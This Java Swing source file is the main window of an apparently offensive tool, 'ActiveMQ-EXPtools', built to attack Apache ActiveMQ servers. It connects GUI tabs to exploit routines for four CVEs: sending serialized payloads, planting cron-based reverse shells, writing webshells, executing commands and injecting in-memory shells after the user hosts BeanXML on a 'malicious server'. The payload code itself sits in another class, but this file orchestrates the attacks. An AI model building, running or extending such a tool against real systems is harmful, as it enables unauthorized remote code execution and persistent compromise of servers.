package cc.kiiy.ui;

import cc.kiiy.service.EnvironmentService;
import cc.kiiy.service.VulnerabilityService;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;

public class MainFrame extends JFrame {
    
    private TopPanel topPanel;
    private TargetEnvPanel targetEnvPanel;
    private SettingsPanel settingsPanel;
    private BeanXmlPanel beanXmlPanel;
    private CVE20155254Panel cve20155254Panel;
    private CVE20163088Panel cve20163088Panel;
    private CVE202241678Panel cve202241678Panel;
    private CVE202634197Panel cve202634197Panel;
    private JTabbedPane mainTabbedPane;
    
    private EnvironmentService environmentService;
    private VulnerabilityService vulnerabilityService;
    
    public MainFrame() {
        setTitle("ActiveMQ-EXPtools-1.1 - by kiiy(https://github.com/Catherines77/ActiveMQ-EXPtools)");
        setSize(1100, 700);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);
        
        environmentService = new EnvironmentService();
        vulnerabilityService = new VulnerabilityService();
        
        initUI();
        setupListeners();
    }
    
    private void initUI() {
        JPanel mainPanel = new JPanel(new BorderLayout());
        mainPanel.setBorder(new EmptyBorder(5, 10, 5, 10));
        
        topPanel = new TopPanel();
        targetEnvPanel = new TargetEnvPanel();
        settingsPanel = new SettingsPanel();
        beanXmlPanel = new BeanXmlPanel();
        
        mainTabbedPane = new JTabbedPane();
        mainTabbedPane.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 16));
        
        cve20155254Panel = new CVE20155254Panel();
        cve20163088Panel = new CVE20163088Panel();
        cve202241678Panel = new CVE202241678Panel();
        cve202634197Panel = new CVE202634197Panel();
        
        mainTabbedPane.addTab("目标环境", targetEnvPanel);
        mainTabbedPane.addTab("CVE-2015-5254", cve20155254Panel);
        mainTabbedPane.addTab("CVE-2016-3088", cve20163088Panel);
        mainTabbedPane.addTab("CVE-2022-41678", cve202241678Panel);
        mainTabbedPane.addTab("CVE-2026-34197", cve202634197Panel);
        mainTabbedPane.addTab("BeanXML设置", beanXmlPanel);
        mainTabbedPane.addTab("程序设置", settingsPanel);
        
        mainPanel.add(topPanel, BorderLayout.NORTH);
        mainPanel.add(mainTabbedPane, BorderLayout.CENTER);
        
        add(mainPanel);
    }
    
    private void setupListeners() {
        topPanel.addEnvDetectListener(e -> detectEnvironment());
        topPanel.addVulnDetectListener(e -> detectVulnerability());
        
        cve20155254Panel.addExecuteListener(e -> sendCustomPayload());
        
        cve20163088Panel.addExecuteCronListener(e -> exploitCVE20163088());
        cve20163088Panel.addExecuteWebshellListener(e -> exploitCVE20163088Webshell());

        
        cve202241678Panel.addExecuteListener(e -> exploitCVE202241678());
        cve202241678Panel.addWriteWebshellListener(e -> writeWebshellCVE202241678());
        
        cve202634197Panel.addInjectListener(e -> injectMemshellCVE202634197());
    }
    
    private void detectEnvironment() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        applyCustomHeaders();
        
        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        
        targetEnvPanel.setResult("开始探测环境信息...");
        
        new Thread(() -> {
            EnvironmentService.EnvResult envResult;
            if (!username.isEmpty() && !password.isEmpty()) {
                envResult = environmentService.detectEnvironmentWithAuth(url, username, password);
            } else {
                envResult = environmentService.detectEnvironment(url);
            }
            
            SwingUtilities.invokeLater(() -> {
                targetEnvPanel.setEnvInfo(envResult.getBaseUrl(), envResult.getHostname(), envResult.getVersion(), envResult.getUptime());
                targetEnvPanel.setResult(envResult.getMessage());
            });
        }).start();
    }
    
    private void detectVulnerability() {
        String url = topPanel.getTargetAddress();
        
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        applyCustomHeaders();
        
        String selectedVuln = topPanel.getSelectedVulnerability();
        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        String xmlServer = topPanel.getHttpServer();
        int openWirePort = topPanel.getOpenWirePort();
        
        targetEnvPanel.clearResult();
        targetEnvPanel.setResult("开始检测 " + selectedVuln + " ...");
        
        new Thread(() -> {
            String result = vulnerabilityService.detectVulnerability(url, selectedVuln, username, password, xmlServer, openWirePort);
            SwingUtilities.invokeLater(() -> targetEnvPanel.setResult(result));
        }).start();
    }
    
    private void applyCustomHeaders() {
        String url = topPanel.getTargetAddress();
        if (!url.isEmpty()) {
            settingsPanel.updateOriginHeader(url);
        }
        cc.kiiy.util.HttpUtil.setCustomHeaders(settingsPanel.getCustomHeaders());
    }
    
    private void sendCustomPayload() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        String queue = cve20155254Panel.getQueue();
        String base64Payload = cve20155254Panel.getBase64Payload();
        
        if (queue.isEmpty() || base64Payload.isEmpty()) {
            cve20155254Panel.setResult("错误：队列名称和 Base64 序列化数据不能为空！");
            return;
        }
        
        int openWirePort = topPanel.getOpenWirePort();
        cve20155254Panel.setResult("正在发送 Payload 到端口 " + openWirePort + " ...");
        
        new Thread(() -> {
            String result = vulnerabilityService.sendBase64Payload(url, queue, base64Payload, openWirePort);
            SwingUtilities.invokeLater(() -> cve20155254Panel.setResult(result));
        }).start();
    }
    
    private void exploitCVE20163088() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        String ip = cve20163088Panel.getIp();
        String port = cve20163088Panel.getPort();
        
        if (ip.isEmpty() || port.isEmpty()) {
            cve20163088Panel.setCronResult("错误：监听 IP 和端口不能为空！");
            return;
        }
        
        cve20163088Panel.setCronResult("正在执行 CVE-2016-3088 (Cron) 漏洞利用...");
        
        new Thread(() -> {
            String result = vulnerabilityService.exploitCVE20163088(url, ip, port);
            SwingUtilities.invokeLater(() -> cve20163088Panel.setCronResult(result));
        }).start();
    }
    
    private void exploitCVE20163088Webshell() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }

        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        String webshellContent = cve20163088Panel.getWebshellContent();
        if (webshellContent == null || webshellContent.trim().isEmpty()) {
            cve20163088Panel.setWebshellResult("错误：Webshell 内容不能为空！");
            return;
        }

        cve20163088Panel.setWebshellResult("正在执行 CVE-2016-3088 (Webshell) 漏洞利用...\n");

        new Thread(() -> {
            String result = vulnerabilityService.exploitCVE20163088Webshell(url, username, password, webshellContent);
            SwingUtilities.invokeLater(() -> cve20163088Panel.setWebshellResult(result));
        }).start();
    }

    private void exploitCVE202241678() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        String method = cve202241678Panel.getExploitMethod();
        String command = cve202241678Panel.getCommand();
        String webshellPath = cve202241678Panel.getWebshellPath();
        String customWebshell = cve202241678Panel.getCustomWebshell();
        
        if (command.isEmpty()) {
            cve202241678Panel.setResult("错误：命令不能为空！");
            return;
        }
        
        if (!webshellPath.isEmpty()) {
            cve202241678Panel.setResult("[*] 开始执行命令...\n");
            new Thread(() -> {
                String result = vulnerabilityService.executeCommandCVE202241678(url, username, password, webshellPath, command);
                SwingUtilities.invokeLater(() -> cve202241678Panel.setResult(cve202241678Panel.getCommand() + " 执行结果:\n" + result));
            }).start();
        } else {
            cve202241678Panel.setResult("[*] 开始执行 CVE-2022-41678 利用...\n");
            new Thread(() -> {
                String[] outPath = new String[1];
                String result = vulnerabilityService.exploitCVE202241678(url, username, password, method, command, customWebshell, outPath);
                SwingUtilities.invokeLater(() -> {
                    if (outPath[0] != null && result.contains("[+] 利用成功！")) {
                        cve202241678Panel.setWebshellPath(outPath[0]);
                    }
                    cve202241678Panel.setResult(cve202241678Panel.getCommand() + " 执行结果:\n" + result);
                });
            }).start();
        }
    }
    
    private void writeWebshellCVE202241678() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        String method = cve202241678Panel.getExploitMethod();
        String customWebshell = cve202241678Panel.getCustomWebshell();
        
        cve202241678Panel.setResult("[*] 开始执行 CVE-2022-41678 Webshell写入...\n");
        new Thread(() -> {
            String[] outPath = new String[1];
            String result = vulnerabilityService.writeCustomWebshellCVE202241678(url, username, password, method, customWebshell, outPath);
            SwingUtilities.invokeLater(() -> {
                if (outPath[0] != null && result.contains("[+] 写入成功！")) {
                    cve202241678Panel.setWebshellPath(outPath[0]);
                }
                cve202241678Panel.setResult("写入执行结果:\n" + result);
            });
        }).start();
    }
    
    private void injectMemshellCVE202634197() {
        String url = topPanel.getTargetAddress();
        if (url.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请输入目标地址！");
            return;
        }
        
        String username = topPanel.getUsername();
        String password = topPanel.getPassword();
        String xmlServer = topPanel.getHttpServer();
        String connectionInfo = cve202634197Panel.getCurrentConnectionInfo();
        
        if (connectionInfo == null || connectionInfo.isEmpty()) {
            JOptionPane.showMessageDialog(this, "请先生成 BeanXML 并复制到你的恶意服务器！");
            return;
        }
        
        cve202634197Panel.setResultText("[*] 开始执行 CVE-2026-34197 内存马注入...\n");
        new Thread(() -> {
            String result = vulnerabilityService.exploitCVE202634197(url, username, password, xmlServer, connectionInfo);
            SwingUtilities.invokeLater(() -> {
                cve202634197Panel.setResultText("注入执行结果:\n" + result);
            });
        }).start();
    }
}
